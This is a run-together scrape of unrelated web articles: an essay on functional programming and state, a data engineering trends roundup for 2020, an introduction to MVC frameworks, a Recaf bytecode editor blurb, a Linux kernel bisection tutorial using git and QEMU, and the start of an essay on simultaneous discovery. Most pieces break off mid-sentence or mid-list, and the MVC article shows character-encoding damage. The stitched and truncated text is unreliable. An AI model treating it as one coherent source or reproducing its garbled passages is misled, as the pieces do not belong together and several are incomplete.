<p>“No man can ever cross the same river twice.” Because what’s a river? I mean, we love this idea of objects; like there’s this thing that changes. Right? There’s no river. Right? There’s water there at one point-in-time. And another point-in-time, there’s other water there. — Rich Hickey, <a href="https://github.com/matthiasn/talk-transcripts/blob/master/Hickey_Rich/AreWeThereYet.md">Are We There Yet</a>, quoting Heraclitus.</p>
</blockquote>
<p>From the perspective of a user, a functional program may appear stateful. Interact with <a href="https://softwarefordays.com/post/functional-programming-and-identity-state-and-time/#stateful-functional-programs">the functional ATM program above</a> and notice the program remembering previous encounters. On the one hand, this is not surprising. We included an imperative layer to remember previous states. Instead of decomposing the state of the program into distinct objects, like <code>bankAccount</code> and <code>withdrawalAmount</code>, we created a single global object, the <code>store</code>. On the other hand, focusing on the “object” portion of the program betrays an object-oriented predisposition. The imperative piece of the program is merely a construct used to facilitate a computation based asynchronously on another. One can even imagine a programming language where such a construct is built into the language itself, hiding any imperative implementation from the programmer’s view. In fact, such a language exists that compiles to JavaScript.<sup><a href="#fn1" id="fnref1">[1]</a></sup> In other words, it is syntax, not semantics. The semantics of the program better align with the semantics of a recursive, iterative function, having state <code>S</code> at a discrete step <code>i</code> — run the functional ATM program with the output of the previous run to produce the input for the next.</p>
<p>That a program with a functional, stateless and timeless core can maintain state is surprising, to say the least. Look around the room, bus, park or wherever you find yourself reading this sentence, and you will likely identify “a collection of distinct objects,” such as dogs, people, and trees, “whose behaviors may change over time.” Look around the functional ATM program, on the other hand, and there are no identifiable objects to be found. Yet, the program appears to have state just like any other object in the room.</p>
<p>However, the ostensible “paradox” dissipates when the augmentation of our conception of time extends beyond the functional program to include the rest of our physical reality.</p>
<blockquote>
<p>One way to resolve this paradox is to realize that it is the user’s temporal existence that imposes state on the system. If the user could step back from the interaction and think in terms of streams of balances rather than individual transactions, the system would appear stateless — <a href="https://web.mit.edu/alexmv/6.037/sicp.pdf">SICP</a> Section 3.5.5</p>
</blockquote>
<p>Instead of viewing the <em>world</em> as the sum of its objects, each reflecting its latest state as time elapses, we may also think in terms of discrete state histories. We may interpret the dog at the park as moving in discrete steps <code>S(i)</code> to <code>S(i+1)</code>, just as we interpret the state of our functional program as moving in discrete steps <code>S(i)</code> to <code>S(i+1)</code>.</p>
<p>Consider video media. To movie scenes, we may attribute the same object-oriented semantics. Character and inanimate objects shift, interact and evolve as time elapses.</p>
<video id="metavideo" poster="https://softwarefordays.com/media/metavideoposter.gif" preload="none" width="480" controls="">
    <source src="https://softwarefordays.com/media/metavideo.mp4" type="video/mp4; codecs=&quot;avc1.42E01E, mp4a.40.2&quot;">
    <img src="https://softwarefordays.com/media/metavideo.mp4" title="Your browser does not support the mp4 video codec.">
</video>
<p>While playing the above video, for example, we may conclude that “a cat is dancing.” Yet, videos are comprised of static frames stitched together in a certain sequence at discrete time intervals. Each frame corresponds to a state of the video at a moment in time and the frames, taken together, a time-denominated series of discrete states. The media chosen above is intentionally meta. The video includes a TV animation of a scene mirrored by a flip-book<sup><a href="#fn2" id="fnref2">[2]</a></sup>, showing static frames strung together at discrete time intervals, which itself is mirrored by a flip-book in “real” life, showing static frames strung together at discrete time intervals. Take another step back to notice that the above gif media (or mp4 if your browser supports html5) being played on <em>your</em> computer is comprised of static frames, strung together at discrete time intervals.</p>
<p>There is nothing stopping us from taking another step back and interpreting the real world in which your computer currently sits as static frames, strung together at discrete time intervals. We <em>may</em> attribute normal object-oriented semantics to the above gif, concluding that “a cat is dancing.” However, we may also attribute functional semantics, concluding that “a cat has arms above its head on frame fᵢ.” At a park in the real world, we may conclude that “a dog is chasing a squirrel.” However, we may also conclude that “a dog is in the running motion behind a squirrel in the running motion on frame fᵢ.” In both cases, we may identify a time-series of states instead of objects that change over time. The functional programming paradigm can be coherently applied to world and program alike.</p>
<p>With a model for discrete time in mind, it is less surprising that functional programs can appear stateful. A user of the program may be viewed as a series of states, just like the program itself. A specific series of user states, for example,</p>
<pre><code>U₀: "Open up this blog post"<br>U₁: “Select 20 option”<br>U₂: “Click withdraw”<br>...<br>U(i): Uᵢ</code></pre>
<p>directly precipitate a series of program states:</p>
<pre><code>S₀: balance:100, amount:10<br>S₁: balance:100, amount:20<br>S₂: balance:80, amount:20<br>...<br>S(i): program(Sᵢ₋₁, Eᵢ)</code></pre>
<p>In both cases, pieces of static information may be listed, one <em>after</em> another. Moreover, both lists can be plotted along the same discrete timeline <code>i</code>. User interactions come in a certain order <code>U(i)</code>, triggering a run of the program function against the result of the previous run <code>S(i-1)</code> and event data <code>E(i)</code>, in order to produce <code>S(i)</code>. Our reality can be viewed as a time-series of states, just as it can be viewed as a collection of objects. Functional programming models a time-series of states, just as as object-oriented programming models objects. When the program and world <em>alike</em> can be viewed as “streams of information that flow in the system,” (<a href="https://web.mit.edu/alexmv/6.037/sicp.pdf">SICP</a> Section 3) the world can flow into the program, and the program back into the world.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Welcome to the 23rd edition of data engineering weekly. This week's edition is a yearend special edition where we will take a more in-depth look at the trends and emerging patterns in data engineering 2020. I divided the trends into the following categories.</p><ul><li><p>Data Infrastructure</p></li><li><p>Data Architecture</p></li><li><p>Data Management</p></li></ul><p>I hope you enjoy the data engineering trends 2020, and please share your thoughts in the comments.</p><p>I know this is a long article with so many links and references. TL;DR If I had to make a top 3 prediction for 2021 and beyond, here are they.</p><ol><li><p><em><strong>Metadata management will become mainstream. The data lineage, data quality, and data discovery tools will merge into a unified data management platform.</strong></em></p></li><li><p><em><strong>Data Mesh principles will get adopted more and drive a unified data management platform.</strong></em></p></li><li><p><em><strong>Lakehouse systems like Hudi, Iceberg, Deltalake will play a significant role in shaping the data engineering architecture.</strong></em></p></li></ol><p>Now, let’s go deep into each category and see the trends and predictions. Happy reading.</p><h2><em><strong><code>Managed Data Infrastructure &amp; Serverless Computing</code></strong></em></h2><p>In 2020, We saw the cloud platforms continue adopting the open-source data infrastructure solutions—the adoption growing from AWS's EMR, Google Cloud data proc, and Azure HDInsight to the recent AWS managed Airflow.</p><p><a href="https://aws.amazon.com/blogs/aws/introducing-amazon-managed-workflows-for-apache-airflow-mwaa/"><code>Introducing Amazon Managed Workflows for Apache Airflow (MWAA)</code></a></p><p>Though opinions differ on cloud platforms packaging the opensource, the cloud-managed infrastructure certainly carry many advantages for the consumers to quickly adopt complex infrastructure and focus on the business problems.</p><h4>2021 &amp; Beyond</h4><p>The rise of serverless architecture particularly very interesting trend in data engineering. The article summarizes the serverless data ops trend</p><p><a href="https://medium.com/swlh/dawn-of-dataops-can-we-build-a-100-serverless-etl-following-ci-cd-principles-3ca587ba1ec0"><code>Dawn of DataOps: Can We Build a 100% Serverless ETL Following CI/CD Principles?</code></a></p><p>Google Cloud launched a Google Cloud Workflow as a serverless orchestration engine.</p><p><a href="https://cloud.google.com/blog/products/application-development/get-to-know-google-cloud-workflows"><code>Get to know Workflows, Google Cloud’s serverless orchestration engine</code></a></p><blockquote><p><em><code>In 2021, It is an exciting space to watch how managed data infrastructure and the rise of serverless computing merge. </code></em></p></blockquote><h2><em><strong><code>Cloud datawarehouse</code></strong></em></h2><p>At the beginning of 2010, tightly coupled computing and storage is a strategy to run large scale data processing engines. 2019 is when the industry finally declared the old way of thinking data processing no longer working and acknowledge the cloud datawarehouse system is the way to go.</p><p><a href="https://medium.com/@acmurthy/hadoop-is-dead-long-live-hadoop-f22069b264ac"><code>Hadoop is Dead. Long live Hadoop.</code></a></p><p>In 2020, Snowflake's successful IPO reassured the cloud datawarehouse systems are the future. The S3 strong read-after-write consistency guarantee is a significant step in adopting object storage for the cloud datawarehouse system, if not already.</p><p><a href="https://aws.amazon.com/blogs/aws/amazon-s3-update-strong-read-after-write-consistency/"><code>Amazon S3 Update – Strong Read-After-Write Consistency</code></a></p><h4>2021 &amp; Beyond</h4><blockquote><p><em><code>The cloud datawarehouse system will continue to dominate and increase the adoption in 2021 and beyond. It will be interesting to watch how the cloud datawarehouse systems are tightly integrating with the data management systems.</code></em></p></blockquote><h2><em><strong><code>Cost Optimization</code></strong></em></h2><p>The cloud datawarehouse systems and the managed data infrastructure adds pressure on optimizing the cost of operating the datawarehouse systems. Netflix writes about cost optimization strategies for its data warehouse system.</p><p><a href="https://netflixtechblog.com/byte-down-making-netflixs-data-infrastructure-cost-effective-fee7b3235032"><code>Byte Down: Making Netflix’s Data Infrastructure Cost-Effective</code></a></p><p>At the same time, the GPU accelerated workload can provide a strategic business advantage. Pinterest and NVIDIA shared how Pinterest using GPU acceleration for visual search.</p><p><a href="https://blogs.nvidia.com/blog/2020/12/16/pinterest-trains-visual-search-faster-nvidia-gpus/"><code>Pinterest Trains Visual Search Faster with Optimized Architecture on NVIDIA GPUs </code></a></p><h4>2021 &amp; Beyond</h4><p>I added cost optimization as a separate section since cost optimization is often an afterthought. The unpredictability of the object storage engines egress and storage cost, handling cold vs. hot data &amp; the need for specialized hardware for a specific workload will be the norm of 2021 and beyond. </p><p>Alluxio is one solution that I am aware of providing tiered data processing capabilities, though not tuned for cost optimization.</p><p><a href="https://hackernoon.com/accelerate-spark-and-hive-jobs-on-aws-s3-by-10x-with-alluxio-as-a-tiered-storage-solution-5c3s3yes"><code>Accelerate Spark and Hive Jobs on AWS S3 by 10x with Alluxio as a Tiered Storage Solution</code></a></p><blockquote><p><em><code>It will be interesting to see how data processing frameworks like Spark, Flink adopting cost optimization as the first class optimization model, cache frequently used datasets and aware of specialized workloads. </code></em></p></blockquote><h2><em><strong><code>Lakehouse</code></strong></em></h2><p>The separation of computing and storage and the scalable object storage like S3 increased the adoption of data lake principles in early 2019. One of the challenges remains to adopt object storage on the lack of transaction guarantees. The support for ACID transactions, data versioning, auditing, indexing, caching, and query optimization are vital characteristics to build large scale data systems. </p><p>In 2020, We noticed the emerging lakehouse frameworks like DataBricks Delta Lake, Apache Hudi, and Apache Iceberg.</p><p><a href="http://cidrdb.org/cidr2021/papers/cidr2021_paper17.pdf"><code>Lakehouse: A New Generation of Open Platforms that Unify Data Warehousing and Advanced Analytics</code></a></p><p>Adobe shared its Iceberg adoption story <a href="https://medium.com/adobetech/iceberg-at-adobe-88cf1950e866"><code>Iceberg at Adobe</code></a></p><p>Uber writes about its journey with Apache Hudi, and EMR now offers Hudi part of EMR</p><p><a href="https://eng.uber.com/apache-hudi-graduation/"><code>Building a Large-scale Transactional Data Lake at Uber Using Apache Hudi</code></a></p><p><a href="https://aws.amazon.com/blogs/big-data/apply-record-level-changes-from-relational-databases-to-amazon-s3-data-lake-using-apache-hudi-on-amazon-emr-and-aws-database-migration-service/"><code>Apply record level changes from relational databases to Amazon S3 data lake using Apache Hudi on Amazon EMR and AWS Database Migration Service</code></a></p><h4>2021 &amp; Beyond</h4><p><a href="https://github.com/apache/iceberg/milestone/7"><code>Icerbeg’s version 2</code></a> to support row level upsert is another interesting development to watch in 2021.</p><blockquote><p><em><code>The Lakehouse systems continue to mature and will play a major role in shaping the data engineering architecture. It will be interesting to watch how lakehouse complement or compete with the likes of Snowflake and Redshift.</code></em></p></blockquote><h2><em><strong><code>Lambda vs. Kappa vs. Lambda-less</code></strong></em></h2><p>Managing the real-time and batch computing and providing one integrated dataset view remains the main challenge in data processing.</p><p>Pinterest writes about some of the complication of Lambda Architecture and its migration journey to the Kappa architecture</p><p><a href="https://medium.com/pinterest-engineering/pinterest-visual-signals-infrastructure-evolution-from-lambda-to-kappa-architecture-f8f58b127d98"><code>Pinterest Visual Signals Infrastructure: Evolution from Lambda to Kappa Architecture</code></a></p><p>LinkedIn took an interesting approach of Lambda-Less model</p><p><a href="https://engineering.linkedin.com/blog/2020/lambda-to-lambda-less-architecture"><code>From Lambda to Lambda-less: Lessons learned</code></a></p><h4>2021 &amp; Beyond</h4><blockquote><p><em><code>There is no real-time vs. batch, it is all about the window that we process, but that is easier to say than the reality. In 2021 and beyond, I hope we will have a more innovative solution in this space.</code></em></p></blockquote><p>Apache Beam is an excellent attempt to bring the model closer. The development of Spark Streaming and the recent Apache Flink’s&nbsp;<a href="https://flink.apache.org/2020/12/15/pipelined-region-sheduling.html"><code>batch computing support</code></a>&nbsp;are some of the trends to watch.</p><h2><em><strong><code>Streaming SQL Engines &amp; OLAP Engines</code></strong></em></h2><p>Real-time computing and insights are critical for many businesses. Event sourcing is a well-established design pattern, and that brings the question of the decade. Can we join streams and compute business metrics or feed everything into OLAP databases and query it?</p><p>Confluent writes about the KSQL materialization process.</p><p><a href="https://www.confluent.io/blog/how-real-time-materialized-views-work-with-ksqldb/"><code>How Real-Time Materialized Views Work with ksqlDB, Animated</code></a></p><p>Materialize writes about joins in detail</p><p><a href="https://materialize.com/joins-in-materialize/"><code>Joins in Materialize</code></a></p><p>On the OLAP engine space Druid, Click House and Pinot adding multiple OLAP features and improves the operational efficiency. Apache Pinot is an impressive OLAP engine gaining momentum in 2020. Uber shared its experience operating Apache Pinot at scale.</p><p><a href="https://eng.uber.com/operating-apache-pinot/"><code>Operating Apache Pinot @ Uber Scale</code></a></p><h4>2021 &amp; Beyond</h4><p>Though streaming SQL engines and OLAP engines solve similar problems, I think there is a fundamental difference. Streaming SQL engines are good for pre-defined analytics, write once, and run workloads continuously. OLAP engines are good for interactive analytics when analytical queries are unknown while building the datasets.</p><blockquote><p><em><code>In 2021 and beyond I expect tighter integration among the Streaming SQL like KSQL and OLAP engines like Pinot.</code></em></p></blockquote><h2><em><strong><code>Data Quality &amp; Metadata Management</code></strong></em></h2><p>The poor data quality costs an estimated $3.1 trillion per year in the USA alone, equating to 16.5% of the GDP.!! The data quality is critical for developing a data pipeline, and your ML model is as efficient as the quality of the data.</p><p><a href="https://medium.com/@expectgreatdata/why-data-quality-is-key-to-successful-ml-ops-a18d6e373ca9"><code>Why data quality is key to successful ML Ops</code></a></p><p>We’ve seen both Microsoft and Airbnb writes about how data quality effort improved its org decision-making process.</p><p><a href="https://medium.com/data-science-at-microsoft/partnering-for-data-quality-dc9123557f8b"><code>Partnering for data quality</code></a></p><p><a href="https://medium.com/airbnb-engineering/data-quality-at-airbnb-e582465f3ef7"><code>Data Quality at Airbnb - Part 1 — Rebuilding at Scale</code></a></p><p><a href="https://medium.com/airbnb-engineering/data-quality-at-airbnb-870d03080469"><code>Data Quality at Airbnb - Part 2 — A New Gold Standard</code></a></p><p>We have seen multiple tools and systems emerged on Data Quality, and this is a pretty good summarization f the data quality ecosystem.</p><p><a href="https://medium.com/memory-leak/data-quality-a-primer-f6a945915511"><code>Data Quality — A Primer</code></a></p><p> One of the most remarkable trends of 2020 in data engineering is the emerging tooling and infrastructure to manage metadata at scale.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
			
			<p>In the last few years Iâ€™ve worked or played with a bunch of MVC frameworks: <strong>Laravel</strong>, <strong>Ruby on Rails</strong>, <strong>Django</strong>, and <strong>AdonisJS</strong>.</p>

<p>With two of them (Laravel and Dango) I also have some experience in production environments. Laravel is the one I know most.</p>

<p>So, what do they all share in common? Whatâ€™s the difference between them and Express, Flask, Sinatra? This article will try to explain the philosophy around those tools.</p>



<p>The web is not only a matter of serving the right file to the user; you usually also want to:</p>

<ul>
  <li>pass arguments, values, cookies, more generally data with the request;</li>
  <li>customize the output: not only in the format (plain html, or json, or â€¦ xml if you are kink enough), but also the data in it (if you are a logged user you may want to see more things than an anonymous user; etc)</li>
  <li>handle security, that is nowadays a first class citizen</li>
  <li>handle authorization, with one of the multiple authorization schemes hat have appeared in the last few years</li>
  <li>be able to scale: in the number of concurrent users, in the size of the handled data, and in the organization of the code itself.</li>
</ul>

<p>The key point here is,<strong>people got tired of solving the same problem over and over and invented a set of tools that standardized/simplified the developerâ€™s job</strong>, allowing to focus more on the business logic than on the details.</p>

<h2 id="so-whats-this-mvc-stuff">So whatâ€™s this MVC stuff?</h2>

<p>M stands for <strong>Model</strong>, and means the data that is manipulated by the framework. In current web frameworks the Model usually corresponds to classes that map to a database (E.g. <code>Person</code> class is linked to the <code>persons</code> table).</p>

<p>V stands for <strong>View</strong> and means the way the data is presented to the user. In my small dev life Iâ€™ve seen many ways to represent this part: JSON responses for example, or plain HTML. Usually, modern MVC tools offer a template system so you can write the <em>products.html</em> page once and then inject the data to be displayed.</p>

<p>C is for <strong>Controller</strong>, the part that will do the dirty job. When a request arrives, the controller will validate the input, fetch the database, apply business rules, and pass it to the right view. Or it will trigger some other systems. <em>This is the part youâ€™ll write in some programming language</em>.</p>

<h2 id="opinionated-vs-unopinionated">Opinionated vs Unopinionated</h2>

<p>Instead of referring to MVC vs Non-MVC frameworks, I think <strong>the best classification is between <em>Opinionated</em> vs <em>Unopinionated</em></strong>. Opinionated frameworks are those that are presented in this article; they give to the dev a lot of pre-made tools with sensible defaults that will do all the heavy lifting. Sad to say, but the developerâ€™s job is sometimes just to configure these tools to make them work as needed.</p>

<p>With <em>unopinionated frameworks</em>, you are alone with a tool that handles requests and responses. You may need to write all the tools you need, and end up creating a framework yourself. An example: you may need to decide how to access the database, or handle authenticationâ€¦ In this category I see <strong>Express</strong>, <strong>Flask</strong>, <strong>Sinatra</strong>.</p>

<h2 id="the-router-in-mvc">The router in MVC</h2>

<p>Almost all the opinionated frameworks expose a functionality called <em>router</em>. Similarly to phisical routers, these pieces of software will understand the URL of a request and will route to the right controller. One can create a route for <code>/products/123</code> and the router will send this request to <code>ProductController</code> calling the appropriate function and passing the parameter <code>123</code> as argument. Isnâ€™t this lovely?</p>

<p>So when I have to debug an application I usually start from here; I try to understand where the router configuration is (usually in <code>routes.php</code> or <code>urls.py</code>), and where the route Iâ€™m interested will point, and follow it.</p>

<h2 id="the-orms">The ORMs</h2>

<p><strong>ORM</strong> stands for <em>Object Relational Mapping</em> and is a framework that allows to express sql queries using class constructs. Almost every major framework ships an ORM that is perfect for simple and sometimes elaborated queries. Basically the Model classes will extend a base class that contains all the boilerplate to read from the DB table and perform queries. For example, in Laravel:</p>

<pre><code>&lt;?php

use Illuminate\Database\Eloquent\Model;

class Flight extends Model
{
    //
}
</code></pre>

<p>The class <code>Model</code> is the base class that will give to <code>Flight</code> all the fancy methods, like:</p>

<pre><code>// Retrieve a model by its primary key...
$flight = Flight::find(1);

// Retrieve the first model matching the query constraints...
$flight = Flight::where('active', 1)-&gt;first();
</code></pre>

<h2 id="template-systems">Template systems</h2>

<p>Almost every MVC framework use a template system, so you can create HTML files with lower effort, even though itâ€™s nowadays very easy to just respond with JSON. Usually it only depends on what you return from the controller.</p>

<h2 id="command-line-utilities">Command line utilities</h2>

<p>Laravel has <strong>artisan</strong>, Python has <strong>manage.py</strong>, Rails has <strong>rake</strong>. These three command line utilities do <em>a lot</em>. They can:</p>

<ul>
  <li><strong>create and execute migrations</strong>, that are operations that will change the structure of your database. You may create a migration to add a new table or change a column., for example. You can also rollback if something doesnâ€™t go as planned. All of that without writing SQLs directly on the DB server. We use this feature on a daily basis during development.</li>
  <li>Likewise the migrations, sometimes you only want to add data in tables, like the values of a select box. This process is called <strong>seeding</strong>.</li>
  <li>Put the server on <strong>maintenance mode</strong> and resume</li>
  <li><strong>create boilerplate</strong> (models, controllers, viewsâ€¦) from command line, so that you only have to fill those generated files</li>
  <li><strong>execute tests</strong></li>
  <li><strong>create custom commands</strong>; for example, we usually create commands for operations that should be triggered by cron, or long-lasting batch commands.</li>
  <li>â€¦and much more! Every tool exposes more or less capabilities.</li>
</ul>



<p>I cannot stress out how important is documentation when using those frameworks. Itâ€™s impossible to remember all the possible commands and configurations. You end up searching through docs, and if those are well written, you donâ€™t need to pay a visit on stack overflow right away. If you write an MVC tool and it doesnâ€™t have an <em>excellent</em> documentation, with a lot of examples, it will probably not be used by anyone.</p>

<h2 id="standardization">Standardization</h2>

<p>Another thing that pays off is that, no matter whoâ€™ll work on what, all the code will look the same, and will be organized the same way. This has some value, since those kind of systems must be maintained over a span of several years, while the average dev only works only 2 years in the same company :)</p>

<h2 id="conclusions">Conclusions</h2>

<p>I hope I donâ€™t have expressed concepts that are too trivial for the average reader; these are the basic info I wish somebody told me at the time.</p>

        <h3>What is Recaf?</h3>
        <p>Recaf is an open-source Java bytecode editor that simplifies the process of editing compiled Java applications. To make things easier Recaf abstracts away much of the internal class file format. Difficult tasks such as updating stack-frames are done automatically. Along with additional features to assist in the process of editing classes, Recaf is the most feature-rich free bytecode editor available.</p>
        
        <h3>Useful Information</h3>
        <p>While Recaf makes bytecode editing a more simple process it does not mean you should dive head-first into editing compiled Java applications without understanding some basic programming concepts and the Java class file architecture. Here are some references for these topics:</p>

<![CDATA[Automatically bisecting the Linux kernel to find a bug]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
<p>Years ago, I needed to track down a specific kernel regression, and I worked out an approach to automatically bisect the kernel, leveraging a combination of git and qemu.
A few days ago, someone posted on reddit that they’d seen a massive BTRFS performance regression in the 5.10 kernel under certain circumstances, and they’d managed to track it down to a commit.  <a href="https://www.reddit.com/r/linux/comments/kieqyu/warning_linux_510_has_a_500_to_2000_btrfs/">https://www.reddit.com/r/linux/comments/kieqyu/warning_linux_510_has_a_500_to_2000_btrfs/</a></p>
<p>I thought it might be interesting to revisit what I’d done, and see if I could automatically track down this specific performance regression using it, and share my approach.</p>
<h2 id="bisection">Bisection?</h2>
<p>The linux kernel source code is managed via the version control software <code>git</code>, with the code stored in a repository.  Git is designed to be decentralised, so you can have a full copy of a repository locally, including each and every way it has changed.  Most changes involve multiple files being updated, after which you commit them to the repository, along with a description of what the commit is.</p>
<p>Most software builds up in complexity over time and will often soon grow to a level of complexity where it’s impossible for any one engineer to have full awareness of the consequences of their change, and sometimes what seems to be a straightforward change can have unexpected consequences elsewhere.  When you’re only dealing with a few commits between a last known good state and failure, it’s easy to quickly track down the specific source of the problem.  As that scales up, tracking down a bug can get increasingly hard.</p>
<p>The linux kernel often has several thousand commits between releases.  If you were to try to track down a regression commit by commit, it’d take a long time to do.  Ideally you’d want to narrow down in on a set of commits related to just where you see the regression, but the cause could always be by another change elsewhere.  One way you can drastically cut down a sorted list is to bisect your way through all the changes: taking the midpoint between a known good and known bad endpoint,  roughly halving the number of commits to be validated each step.  A quick example, assuming 1000 commits to start with (and rounding down for ease):   1000 -&gt; 500 -&gt; 250 -&gt; 125 -&gt; 62 -&gt; 31 -&gt; 15 -&gt; 7 -&gt; 3.  You can see that the number of commits to be checked very quickly got down to manageable chunks.</p>
<p>It’s worth noting that this approach has a series of assumptions baked in to it, for example we’re assuming that one commit introduced the bug.  Just because bisecting gets you down to a specific commit, doesn’t mean that only that commit is the issue.  It should act as a good starting point for investigation, however.  About 4 years ago I spent a week bisecting a kernel manually, as a somewhat background task, trying to track down what we thought was a kernel bug. What we actually found was a piece of software was making assumptions of specific behaviour from the kernel, that is explicitly stated is not guaranteed. The tracked down commit that “caused” the issue appeared to just mark a change in some optimisation in the compiler.  Fix the assumptions and problems vanished.</p>
<p>The git tool has built in native support for bisecting commits, allow you to designate commits or tags as “good” and “bad”, and then walk you through the process.  It also supports automatic bisection, if you provide it a command that will exit with a status code of 0 for good commits, and any other status code for bad commits.</p>
<h2 id="automating-kernel-bisection">Automating kernel bisection</h2>
<p>The easiest way to do this is to come up with a way to replicate the bug using a virtual machine (VM), spun up on the machine carrying out the bisection.  Build the kernel, launch a VM that uses it, and along with some way to trigger the behaviour you’re interested in.  With the need to do this in an unattended fashion, we need to use something like QEMU to handle the VM side of things, instead of something like VirtualBox.</p>
<p>The bug in question comes with replication instructions: Extract the latest firefox sources to an empty BTRFS formatted volume.  The original reporter found the time drastically increased for the operation, regardless of where the volume was, with USB storage seeing a particularly large hit.  Presumably that indicates a lot more round trip calls to storage.</p>
<p>So to automatically bisect the kernel we’re going to need:</p>
<ul>
<li>Full kernel source code checked out via git</li>
<li>QEMU installed and ideally able to run in an accelerated fashion.  In this case I found unaccelerated to be more than 10x slower for the task at hand.</li>
<li>A way to replicate the bug and pass the right status code back.  Given we’re extracting a tarball, we’ll want a full initramfs rather than a single binary initrd (In the appendix I’ll give some proformer Go and C code that could be used as a monolithic initrd)</li>
<li>A way to make an empty BTRFS volume of sufficient size for each loop.</li>
<li>A directory to do this under.</li>
</ul>
<pre><code>mkdir ~/bisecting
</code></pre><h2 id="kernel">Kernel</h2>
<p>This part is pretty straightforward.</p>
<pre><code>cd ~/bisecting/
git clone https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git
</code></pre><p>Let’s make sure we can build a known good kernel, with BTRFS enabled, and run it under QEMU.  The default configuration for linux kernel doesn’t have BTRFS enabled, so we’ll need to specifically enable it, and then enable the default options for it.  We’ll then take a copy of the configuration to use as a base for bisecting, before finally building the kernel ready to use, using every available core.</p>
<pre><code>cd ~/bisecting/linux
git checkout v5.9    # That's bbf5c979011a099af5dc76498918ed7df445635b
make defconfig
echo "CONFIG_BTRFS_FS=y" &gt;&gt; .config
make olddefconfig
cp .config ../kernelconfig
make -j $( nproc )
</code></pre><p>On the system I’m using, the QEMU binary I want is <code>qemu-system-x86_64</code>.   On RHEL8 and derivatives, it has become <code>qemu-kvm</code>, under <code>/usr/libexec</code>.  Spinning up a new VM, with 4G of ram, using KVM acceleration:</p>
<pre><code>sudo qemu-system-x86_64 -enable-kvm -nographic -append console=ttyS0 -kernel arch/x86/boot/bzImage -m 4G
</code></pre><p>You should see this launch, and ultimately result in a kernel panic after a few seconds, because it was unable to mount a root fs.  That’s expected, we didn’t give it one!  Hit <code>ctrl+a</code> and then <code>x</code>, and QEMU will terminate the VM.</p>
<p>Okay, so that’s a viable kernel. Now we need to create a BTRFS volume to pass to the machine as a local drive, before we create an initramfs to drive the experiment.</p>
<h2 id="btrfs-volume">BTRFS volume</h2>
<p>This part is super simple, but we’ll need to know how big to make it.  I’m going to use the 84.0.1 sources, and find out how big they are uncompressed</p>
<pre><code>cd ~/bisecting
wget https://archive.mozilla.org/pub/firefox/releases/84.0.1/source/firefox-84.0.1.source.tar.xz
xz -l firefox-84.0.1.source.tar.xz
</code></pre><p>This returns:</p>
<pre><code>Strms  Blocks   Compressed Uncompressed  Ratio  Check   Filename
    1      12    352.8 MiB  2,203.4 MiB  0.160  CRC64   firefox-84.0.1.source.tar.xz
</code></pre><p>So we should assume at least 2.2GB of storage needed once extracted.  We’ll want to give it plenty of headroom to avoid any behavioural changes that may be triggered when the drive is nearly full.  So let’s take 10G as a reasonable starting point.   Most file systems support “sparse” files, so we won’t actually take up 10G of space, only whatever is used.  We can use <code>truncate</code> to create a sparse 10G file, and then <code>mkfs.btrfs</code> to format it</p>
<pre><code>truncate -s 10G btrfs
mkfs.btrfs btrfs
</code></pre><p>Okay, that’s the easiest bit done.  Now on to initramfs creation.</p>

<p>An initramfs is a CPIO archive, typically gzip’d, containing a simple filesystem.  We can create something suitable pretty much anywhere we like, and just package it up.</p>
<p>Let’s create the skeleton of one first:</p>
<pre><code>mkdir -p ~/bisecting/initramfs/{bin,sbin,etc,proc,sys}
</code></pre><p>At the very least we’re going to need <code>tar</code> and <code>time</code> while we experiment creating a reproduceable test, and ideally the <code>timeout</code> command for when we automate it.  The easiest way to achieve this is via busybox (<a href="https://www.busybox.net/)">https://www.busybox.net/)</a>.  We’ll need a statically compiled (entirely self contained) version of busybox for this.  On Debian derivatives, you can install the <code>busybox-static</code> package via <code>apt</code>.  Alternatively you could download the binary from Busybox direct: <a href="https://www.busybox.net/downloads/binaries/">https://www.busybox.net/downloads/binaries/</a>.  Verify that it is statically compiled by running <code>ldd</code> against the busybox binary.  It should report “not a dynamic executable”.  We’ll need a copy installed in the initramfs:</p>
<pre><code>cd ~/bisecting/initramfs/bin
cp /path/to/busybox ./
./busybox --install .
ls
</code></pre><p>You should see from the ls output that busybox is providing a number of standard linux tools.</p>
<p>Now we’ll need a <code>init</code> script to go along with it.  We’re going to aim for fairly minimal as we’re exploring this. What we’ll ideally want is the firefox sources, and a shell prompt.</p>
<pre><code>cd ~/bisecting/initramfs
cp ../firefox-84.0.1.source.tar.xz ./
cat &gt; init &lt;&lt; EOF
#!/bin/sh

# mount special mount points
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -n -t tmpfs none /dev
mdev -s

# Give us a shell
sh

# Power off the machine when done
poweroff -f
EOF

chmod +x init
</code></pre><p>That gives us everything we should need, we just need to convert it in to the initramfs.</p>
<pre><code>find . | cpio -H newc -o | gzip &gt; ../initramfs.gz
</code></pre><p>We now have:</p>
<ul>
<li>a kernel</li>
<li>an initramfs</li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>I</h2><p>Why do so many discoveries happen at roughly the same time to different people? There are cool sounding names like <a href="https://en.wikipedia.org/wiki/Multiple_discovery">multiple discovery</a> and <a href="https://www.cracked.com/pictofacts-687-12-inventions-created-by-different-people-at-same-time/">simultaneous invention</a> here which only serves to make the amazing seem rather mundane.</p><ul><li><p>Newton created calculus and definitely was an all round well credentialed genius. But at the exact same time Leibniz cooked it up too, somewhere far enough away that it seems like a spooky coincidence.</p></li><li><p>Evolution, probably one of the greatest discoveries known to man, so controversial that it's still about as counterintuitive as quantum physics, was simultaneously theorised by Darwin and Alfred Russel Wallace.</p></li><li><p>Did you know that neutrinos have mass? Well Arthur McDonald and Takaaki Kajita figured it out independently at the same time and got to share a Nobel for it</p></li><li><p>In the 1770s a few interesting things happened. There was that British colony that got uppity. But before that two people figured out what Oxygen was only a couple of years apart</p></li><li><p>Jet engines were built by the Allies and Germans independent of each other trying to one up the other side during World War II</p></li><li><p>Every chemistry student's nightmare of the periodic table of elements, with all its legendary internal coherence and annoying organisation, was discovered by Mendeleev and Lothar Meyer a year apart</p></li></ul><p>What gives?</p><p>One option of course is that out of the total sum of all inventions and discoveries that we've made as humankind, this is a tiny fraction. And though it's a sampling, it would actually be <em>even weirder</em> if there were zero coincidences like this. That's where Wikipedia comes to the rescue and 